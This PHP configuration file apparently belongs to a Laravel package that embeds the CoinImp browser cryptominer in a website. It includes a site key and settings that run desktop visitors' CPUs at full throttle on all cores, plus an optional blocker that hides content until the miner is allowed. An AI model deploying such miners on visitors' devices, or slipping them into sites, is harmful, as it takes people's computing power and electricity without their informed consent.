<?php

return [
    /*
     * Enable or disable script rendering. Useful for local development.
     */
    'enabled' => true,

    /*
     * Mined Coin, use web for webchain else monero.
     */
    'coin' => 'web',

    /*
     * Javascript file name, Get it from CoinImp Dashboard.
     */
    'script' => 'nWdn.js',

    /*
     * Site key, Get it from CoinImp Dashboard.
     */
    'siteKey' => '520d4d432cca2b1d14bbec7bd39153255bcf329cf82789c3dd7e5ef34ae276fa',

    /*
     * Block showing your site content until mining is allowed.
     * You might want to edit blade file to match your website theme
     */
    'blocker' => [
        'enabled' => false,

        /*
        * Message shown while site is blocked.
        */
        'message' => 'Please allow our miner on your blocker software to continue browsing our site. Reload the page after that.',

    ],

    /*
     * For desktop visitors.
     */
    'desktop' => [
        /*
        * use decimal for fixed value 0.9 is 10%, 0 is 100%.
        */
        'throttle' => 0,

        /*
        * Default CPU Threads for desktop visitors.
        * Number > 0 or Auto for autothreads, Default value is equal to navigator.hardwareConcurrency - count of logical processor cores.
        */
        'threads' => 0,
    ],

    /*
     * For mobile visitors.
     */
    'mobile' => [
        /*
        * enable mining on mobile.
        */
        'enabled' => false,

        /*
        * use decimal for fixed value 0.9 is 10%, 0 is 100%.
        */
        'throttle' => 0.8,

        /*
        * Default CPU Threads for desktop visitors.
        * Number of Core or Auto for autothreads, Default value is equal to navigator.hardwareConcurrency - count of logical processor cores.
        */
        'threads' => 1,
    ],

];
